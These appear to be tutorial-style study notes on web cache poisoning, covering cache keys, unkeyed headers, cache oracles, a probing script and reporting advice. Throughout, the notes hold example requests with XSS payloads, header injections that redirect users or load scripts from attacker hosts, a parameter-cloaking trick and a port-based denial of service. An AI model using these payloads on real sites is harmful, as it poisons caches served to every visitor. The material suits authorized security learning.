Tools: **[param-miner](https://github.com/PortSwigger/param-miner)** & https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner

To use it, right-click on a request in Burp and click “Guess (cookies|headers|params)”. If you’re using Burp Suite Pro, identified parameters will be reported as scanner issues. If not, you can find them listed under Extender->Extensions->Param Miner->Output

---
a web cache is a system that temporarily stores web documents such as HTML pages, images, and media files to reduce bandwidth usage, server load, and latency. It serves copies of requested content directly to users, avoiding the need to fetch it from the original server. Web caches are implemented at various levels, including browser caches, proxy caches, and content delivery networks (CDNs)
## What is cache key

When a web cache receives an HTTP request, it assesses whether there is a cached response it can directly serve or if it needs to forward the request to the back-end server. The cache identifies equivalent requests by comparing a predefined subset of components, collectively known as the "cache key," typically including the request line and Host header. Components not included in the cache key are deemed "unkeyed.”

If the cache key of an incoming request matches that of a previous request, the cache treats them as equivalent. Consequently, it serves a copy of the cached response generated for the original request. This behavior persists for all subsequent requests with the matching cache key until the cached response expires.

This means that caches think the following two requests are equivalent, and will happily respond to the second request with a response cached from the first:

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close

```

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```

As a result, the page will be served in the wrong language to the second visitor.

## Constructing a web cache poisoning attack

Constructing a basic web cache poisoning attack involves the following steps:
- **Identify and evaluate unkeyed inputs**
  - Using Param Miner
    Run guess headers from `Param Miner`
    If a request containing one of its injected inputs has an effect on the response, Param Miner   logs this in Burp, either in the "Issues" pane, or in the "Output" tab of the extension
    For example, in the following screenshot, Param Miner found an unkeyed header `X-Forwarded-Host` on the home page of the website:
    ![[Pasted_image_20240122152547.webp]]
- **Elicit a harmful response from the back-end server**
  After identifying an unkeyed input, the subsequent step involves assessing how the website processes this input. Gaining a comprehensive understanding of this processing is crucial for triggering a harmful response successfully. If the input is reflected in the server's response without adequate sanitization or is utilized to dynamically generate additional data, it becomes a potential vulnerability for web cache poisoning.
- **Get the response cached**
  Various factors, including file extension, content type, route, status code, and response headers, influence whether a response is cached. Experimentation with different requests on various pages is often necessary to understand the cache behavior.
---
# Exploiting cache design flaws

## XSS Via Web Cache Poisoning

If you have unkeyed input is reflected in a cacheable response without sanitization this could be easy to exploit
For example this is the request and the response of the website

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk
```

```
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="<https://innocent-website.co.uk/cms/social.png>" />
```

We can see that the value of the `X-Forwarded-Host` is used to generate an `Open Graph` image URL and then it's reflected in the response

**XSS Exploitation :**

```
X-Forwarded-Host: a."><script>alert(1)</script>"
```

```
HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="<https://a>."><script>alert(1)</script>"/cms/social.png" />
```

Now all users who access `/en?region=uk` would be served this XSS Payload

---
## Exploiting unsafe handling of resource imports

Certain websites utilize unkeyed headers to dynamically create URLs for importing external resources, such as JavaScript files hosted externally.

If the response, which includes this manipulated URL, is cached, the attacker's JavaScript file has the potential to be imported and executed in the browser session of any user whose request aligns with the matching cache key.

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0
```

```
HTTP/1.1 200 OK
<script src="<https://evil-user.net/static/analytics.js>"></script>`
```

---
## Exploit Web Cache Poisoning using multiple headers

Some websites demand more sophisticated attacks and only become vulnerable when an attacker can craft a request that manipulates multiple unkeyed inputs.

For instance, consider a website that mandates secure communication via HTTPS. To enforce this, if a request employing a different protocol is received, the website dynamically generates a redirect to itself using HTTPS:

Original Request:

```
GET /random HTTP/1.1
Host: evil-site.com
X-Forwarded-Proto: http
```

Server Response:

```
HTTP/1.1 301 Moved Permanently
Location: <https://evil-site.com/random>
```

This exploit this behavior to generate a cacheable response that redirects users to a malicious URL.
Step-by-step chain:

1. **Attacker forges headers** so that the origin generates a redirect whose `Location:` points at an attacker-controlled host.
    - They set `Host: victim.com` **or** `Host: evil-site.com` depending on which host they target in cache; crucially they craft the values used by the origin to build `Location:` so it points to an attacker site.
2. **Server issues a redirect** to `https://<value-from-Host>/<path>` because it thinks the incoming request was `http` (thanks to `X-Forwarded-Proto: http`).
3. **A cache in front of the origin stores that redirect**. If the cache key does not include `X-Forwarded-Proto` or the exact header(s) the origin used, the redirect response will be stored under the normal cache key for `GET /random` on `victim.com`.
4. **Later, real users request the same URL (without malicious headers)** and the cache serves the stored redirect — **redirecting them to the attacker-controlled `https://...`**

---
## Information exposure in the responses

Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior.
### Cache-control directives

Sometimes, responses explicitly disclose information essential for a successful cache poisoning attack.

For instance, certain responses reveal details such as the frequency of cache purges or the age of the currently cached response:

```
HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age=1800
```

Understanding such information can aid attackers in refining their approach, potentially leading to more effective cache poisoning.

### Vary Header

When a cache receives a request that can be satisfied by a cached response that has a `Vary` header field, it must not use that cached response unless all header fields as nominated by the `Vary` header match in both the original (cached) request and the new request.

```jsx
GET /random HTTP/1.1
Host: evil-site.com
User-Agent: fakebrowser
```

```jsx
HTTP/1.1 200 OK
vary: User-Agent
X-Cache: hit
<script src="<https://evil-user.net/static/analytics.js>"></script>`
```

For this cached response the vary header contain the `User-Agent` make it a part of the cache key so the users using `fakebrowser` will get this cached response when they access the same end point

---
# Exploiting cache implementation flaws

### ⚙️ **Cache Key Flaws**

Websites often transform inputs before using them as part of a cache key.  
These transformations can create **mismatches** between:

- What the cache sees as “same” (cache key)
- What the application processes internally (actual data)

#### Common transformations that cause vulnerabilities:

1. **Excluding the query string**  
    → Cache ignores everything after `?`, but the application uses it.  
    Example:
    ``` sql
    /home?user=admin  → Cache key: /home
    ```
    1. The attacker could modify `user` to inject malicious behavior, but the cache will still serve that response to everyone visiting `/home`.
2. **Filtering out specific query parameters**  
    → Some parameters may be ignored by the cache but processed by the backend.
3. **Normalizing input in keyed components**  
    → Changing uppercase/lowercase, sorting parameters, or trimming slashes can make different requests seem “identical” to the cache.

➡️ Result: **The cache stores malicious content that doesn’t match the application’s intended behavior.**
### 🔍 **Cache Probing Methodology**

Finding and exploiting cache implementation flaws isn’t as simple as regular web cache poisoning — it needs understanding of how the cache behaves internally.
#### The process usually involves:

1. **Locate a suitable cache oracle**
    - A “cache oracle” is a mechanism that tells you whether a request was served from cache or not.  
        Example: A header like `X-Cache: HIT` vs. `X-Cache: MISS`.
2. **Investigate key handling**
    - Send different requests to test what parts of the URL, headers, or parameters affect the cache key.  
        (e.g., does changing `?a=1` vs. `?a=2` result in different cache behavior?)
3. **Identify a vulnerable gadget**
    - A “gadget” is the component or parameter that reflects your input into the response (like an unsensitized header or reflected parameter).
    - If you can inject a payload here that gets cached, you can perform **cache poisoning**.

## Quick manual probes (benign markers)

Use these `curl` commands to observe caching behavior. They’re safe (no payloads), and include recognizable markers you can search for.
- Probe and show cache headers + body:
   ```bash
   curl -i "http://localhost:8080/?marker=TEST_A"
   ```
- Repeat same request to see `HIT` vs `MISS`:
  ```bash
  curl -i "http://localhost:8080/?marker=TEST_A"
  curl -i "http://localhost:8080/?marker=TEST_A"
  ```
- Slightly different query to check if cache keys include query:
  ```bash
  curl -i "http://localhost:8080/?marker=TEST_B"
  ```
- Test header-based variations (does cache vary by header?):
  ```bash
  curl -i -H "X-Experiment: 1" "http://localhost:8080/?marker=HDR_A"
  curl -i -H "X-Experiment: 2" "http://localhost:8080/?marker=HDR_A"
  ```
If responses for different query strings produce different cache behavior, the cache key includes the query. If they produce the same cached response despite different query strings, that’s a red flag in a real target

## Common pitfalls & how to interpret ambiguous signals

- Some CDNs strip cache headers. Use body content and timing to infer caching.
- `Age` header shows how long response has been cached.
- Cache hit by one instance may not mean global CDN cache hit — be explicit about scope in your report.
## Identify a suitable cache oracle
A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior.
- **HTTP headers**
  Look for headers like:
```
X-Cache: HIT / MISS
CF-Cache-Status: HIT / MISS / EXPIRED
Age: 56
Via: 1.1 varnish
```
 - **Dynamic content changes**
   If the page normally shows something dynamic (like a timestamp, visitor ID, etc.), and it _stops changing_ across requests, that means it’s being served from cache.
- **Timing differences**
  Cached responses are much faster.  
  If the first request is slow (backend-generated) and subsequent identical requests are significantly faster → the page is cached.

### What to test for (safely)

You’ll send requests that differ slightly in certain parts and observe whether they create separate cache entries or reuse the same one.

Look for whether:

- Query strings are ignored
- Specific query parameters are excluded
- Parameter order matters
- Host header or port is stripped
- Case sensitivity (`A` vs. `a`) matters
- URL encoding (`%41` vs. `A`) is normalized

## 💣 3. **Identify an Exploitable Gadget**

### 🧠 What’s a gadget?

A **gadget** is a piece of functionality on the site that reflects or reacts to user input in a way that can be abused — such as:

- **Reflected XSS** (your input shows up in HTML/JS)
- **Open redirect** (`?next=http://evil.com`)
- **Content injection** (unescaped user input in body or headers)

On their own, these are **reflected vulnerabilities** (only affect someone who clicks a crafted link).  
But combined with caching issues, they become **stored** — meaning **every user** gets the poisoned version automatically.

Make benign changes to your requests and watch your cache oracle:

1. Add `?test=1` → Cache MISS
2. Add `?test=2` → Cache HIT  
    ⟹ means the cache ignores the query parameter when building the key.
You can also try:
``` bash
curl -I https://target/page
curl -I https://target/page?x=1
curl -I https://target/page?x=2
curl -I -H "Host: target.com:8080" https://target/page
```
Compare headers, `Age`, and timing.
If different requests give identical cache hits — you’ve found a **cache key normalization flaw**.
Let’s say:

- `/welcome?name=Mostafa` shows “Welcome, Mostafa”
- Cache key ignores the query string
- You (legally testing!) send:
  `/welcome?name=<script>alert(1)</script>`

## Unkeyed Port
The Host header, usually included in the cache key, might not seem like an obvious target for payload injection at first. However, some caching systems parse this header and exclude the port from the cache key. Exploiting this behavior can result in web cache poisoning.

For example, if a redirect URL is generated dynamically based on the Host header, adding an arbitrary port could trigger a denial-of-service attack. This action would redirect all users visiting the home page to a nonfunctional port, leading to downtime until the cache expires.

Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the `Host` header to dynamically generate the `Location` header in the response:
``` http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```
To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:

``` http
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
Next, we'll send another request, but this time we won't specify a port:
``` http
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```

---
`GET /js/geolocate.js?callback=setCountryCookie`
and this is the response :
``` http
HTTP/2 200 OK
Cache-Control: max-age=35
Age: 0
X-Cache: miss
...
setCountryCookie({"country":"United Kingdom"});
```

``` http
GET /js/geolocate.js?callback=hacker
----------
HTTP/2 200 OK
...
hacker({"country":"United Kingdom"});
```

``` http
GET /js/geolocate.js?callback=setCountryCookie&callback=hacker
----------
HTTP/2 200 OK
...
hacker({"country":"United Kingdom"});
```

If you append the second `callback` parameter to the `utm_content` parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
``` http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=anything;callback=alert(1)

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
alert(1)({"country" : "United Kingdom"})
```
Now as the first `callback` only is keyed and the the second one is not keyed means that when any one make a request to the endpoint `GET /js/geolocate.js?callback=setCountryCookie` he will get our poisoned cached response
This works because some frameworks like `Ruby on Rails` sees the semicolon and splits the query string into three separate parameter

## Chaining Unkeyed Inputs
1. 
``` http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: xyz
```

``` http
HTTP/1.1 200 OK
Set-Cookie: locale=en; domain=xyz
```

2. 
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```

```http
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net
```

3. 
```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```

```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en
```

---
## Test static assets (CSS / JS / images / fonts)
Static assets (CSS, JS, images) are often cached with long TTLs and served from many edge nodes. Poisoning one of those is high-impact because everyone who loads the site will fetch the tainted asset.
prove you can make `https://target.example/assets/style.css` contain your marker `/* BH-1234 */` and that subsequent requests return that marker
``` bash
# step 1: send a request that causes origin to generate a unique CSS body (expect MISS)
curl -i -H "X-Experiment: cache-bust-BH-1234" "https://target.example/assets/style.css?force=1" -o step1.txt
# inspect step1.txt — the origin should have responded and (if vulnerable) included "BH-1234"
```

```bash
curl -i "https://target.example/assets/style.css" -o step2.txt
```
3. **What to look for**
- Body contains `BH-1234` in `step2.txt`.
- Headers show caching: look for `Age`, `X-Cache: HIT` or `CF-Cache-Status: HIT`. 
- Timeline: `step1` shows `MISS`, `step2` shows `HIT`.

**Impact** : All users loading the site will receive the poisoned stylesheet (defacement / potential XSS if scriptable).

---
1. 
![[1_qysX388cvvszR9UOW3PbmA.webp]]
2. 
   The response returned as:

```
HTTP/1.1 200 OK  
<Snip....  
...Snip>>  
X-Cache: Miss from cloudfront  
```
While a similar request to /redacted-page2 yielded **almost** the same response:
```
HTTP/1.1 200 OK  
<snip ...  
.... snip>  
X-Cache: Hit from cloudfront
```
since it was a production website I couldn’t damage the availability of the website, so I had to be careful while testing, therefore I cached different parameters by sending requests like: /redacted-page2?dontpoisoneverycache=1, etc.

I started sending out different headers, by changing the Host header, to see If I was able to redirect the mass users but it returned a server error. Then I tried adding:

```
X-Forwarded-Host: evil.com  
X-Host: evil.com
```
To my surprise, it was appended as a link on the web-page as:
`<a href=”http://evil.com/redacted-page2" >`
3. 
   if u try opening `../my-settings` in incognito mood it won't open
   but if u try `../my-settings/test.css` it will
4. 
   **Request**:
```
GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2   
Host: Redacted  
X-Forwarded-For: xss   
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
X-Forwarded-For: >   
Cookie: gdId=xss</script%20
```
**Response**:
```
guid="</script ","24.99.19.20","xss","xss><svg/onload=globalThis[`al`+/ert/.source]`1`//,">  
```
After Poisoned an URL with an XSS, an attacker just needed to send it to the victim
`redacted.com/xxx/xx/xxx.xx/x.js?t=2021111121`


---

``` http
GET / HTTP/1.1
Host: www.vuln.com
X-Forwarded-Host: a.\"><script>alert(1)</script>
```

``` http
GET / HTTP/1.1
Host: unity3d.com
X-Host: evil.com
```

``` http
GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
X-Forwarded-Host: a"><iframe onload=alert(1)>
```

```http
GET / HTTP/1.1
Host: www.goodhire.com
X-Forwarded-Server: evil
```

6. Hidden Route Poisoning

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: evil
```

The response is

```
HTTP/1.1 302 Found
Location: https://ghost.org/fail/
```

When a user first registers a blog with Ghost, it issues them with a unique subdomain under ghost.io. Once a blog is up and running, the user can define an arbitrary custom domain like blog.cloudflare.com. If a user has defined a custom domain, their ghost.io subdomain will simply redirect to it:

```
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: noshandnibble.ghost.io
```

The response is

```
HTTP/1.1 302 Found
Location: http://noshandnibble.blog/
```

---
![[Pasted image 20251026135826.png]]
- **Find a cacheable endpoint** (like `/profile`, `/user`, `/blog`).
- Try to inject a **unique domain** via headers or parameters.
- Use **Interactsh** to detect if your payload causes any callbacks.
  - For JS or HTML assets: add `<img src="https://abcd1234.interact.sh/BH-999">` or `<script src="https://abcd1234.interact.sh/p.js"></script>`.
  - For redirects: set `Location: https://abcd1234.interact.sh/`.
- If yes → you’ve proven that the cache is storing your injected content → escalate it (XSS, redirect, etc.).
- If the cached response is visible to all users → report it as **cache poisoning** with proof of impact.

---
# High-priority endpoints to test (fast wins)

1. **Home / index pages (`/`, `/index.html`)**
    
    - Often cached at CDN edge. If poisoned, impact is broad (everyone).
        
    - Look for redirects or dynamic content that reflect host/headers.
        
2. **Static assets served from the webroot** (`/robots.txt`, `/favicon.ico`, `/sitemap.xml`, `/index.html`)
    
    - CDNs commonly cache these with long TTLs. If one can make the origin return attacker-controlled content here, many users can be impacted.
        
3. **Common 404 / error handlers** (`/nonexistent`, custom 404 pages)
    
    - Error pages are sometimes cached inadvertently and can be abused to serve attacker content site-wide.
        
4. **Content negotiation / SPA entry points** (`/app`, `/index.html`, routes that return HTML for many paths)
    
    - Single-page apps often return the same `index.html` for many URLs — poisoning this is high impact.
        
5. **Redirect endpoints** (pages that send 301/302/307 responses)
    
    - Redirects are powerful: poisoning a redirect can create persistent open-redirects or DoS via bad ports/domains.
        
6. **Preview / staging / “preview-token” pages (prerender, editor previews)**
    
    - Often generate content from request headers/params and may be cached incorrectly.
        
7. **Public file upload or attachment endpoints** (`/uploads/*`, `/media/*`, `/images/*`)
    
    - If origin reflects filename or metadata in served content and caches it, poisoning can spread.
      

8. **User profile / avatar URLs that map to predictable paths**
    
    - If cache keys don’t include user differentiators, one cached response can be shown to others.
        
9. **Search / query pages that return HTML** (`/search?q=...`)
    
    - If cache ignores query string, reflected content in results becomes persistent.
        
10. **API endpoints that accidentally return HTML (error pages, HTML inside JSON)**
    
    - Some endpoints are meant for JSON but return HTML on error; proxies may cache those.
        
11. **Login / logout / session endpoints (careful)**
    
    - These are sensitive — only test in scope. Caching mistakes here can be serious.
        
12. **Third-party integration endpoints (webhooks, redirects to external domains)**
    
    - If backend composes redirects based on headers or params, poisoning can cause misrouting.
        
13. **Versioned/static asset directories** (`/static/v1/...`, `/assets/...`)
---
# Headers & request parts to vary (what caches _may_ key on or ignore)

- `Host` / `Host: <host>:<port>` (unkeyed ports)
    
- `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Original-URL`, `X-Rewrite-URL` (proxy / hidden route vectors)
    
- `Accept`, `Accept-Encoding` (some caches key on these)
    
- `Origin`, `Referer` (sometimes used for Vary)
    
- `Cookie` (site may vary but CDN may ignore or strip)
    
- `User-Agent` (rarely keyed on, but possible)
    
- Query string variations (`?a=1` vs `?a=2`) — test if ignored
---
# How to safely escalate findings into a report (authorized tests)

When you confirm suspicious behavior in an authorized test, prove impact **without causing harm**:

- Use _benign markers_ (unique strings) to demonstrate cache influence.
    
- Show `X-Cache` / `Age` headers or backend logs proving cached content is served.
    
- Show a sequence: request A (with marker) → cache stores content → request B (another client) receives the same content.
    
- Describe possible impact (e.g., persistent XSS, HTML content spoofing, redirect) without demonstrating malicious payloads on a production target.
    
- Provide clear remediation steps: include parameter in cache key, set `Cache-Control: private`, normalize consistently, or add `Vary` headers.


----
This script sends permutations of query params and headers and logs whether responses are cached (via header `X-Proxy-Cache` or by body equality and timing). Run it against your lab or any authorized target.
``` python
#!/usr/bin/env python3
import requests
import time
from itertools import product

BASE = "http://localhost:8080/"
queries = ["marker=PROBE1", "marker=PROBE2", "a=1", "a=2"]
headers_to_test = [
    {},
    {"X-Test": "1"},
    {"X-Test": "2"},
]

def send(u, headers=None):
    start = time.time()
    r = requests.get(u, headers=headers or {})
    dt = time.time() - start
    return r, dt

def main():
    results = []
    for q, h in product(queries, headers_to_test):
        url = BASE + "?" + q
        r1, t1 = send(url, h)
        r2, t2 = send(url, h)  # repeated to test cache
        cache1 = r2.headers.get("X-Proxy-Cache") or ""
        same_body = (r1.text == r2.text)
        results.append({
            "url": url,
            "headers": h,
            "first_cache": r1.headers.get("X-Proxy-Cache"),
            "second_cache": r2.headers.get("X-Proxy-Cache"),
            "same_body": same_body,
            "first_time": t1,
            "second_time": t2
        })
    # print summary
    for r in results:
        print(f"{r['url']} headers={r['headers']}")
        print(f"  first_cache={r['first_cache']} second_cache={r['second_cache']} same_body={r['same_body']} times={r['first_time']:.3f}/{r['second_time']:.3f}")
        print("-"*60)

if __name__ == "__main__":
    main()
```
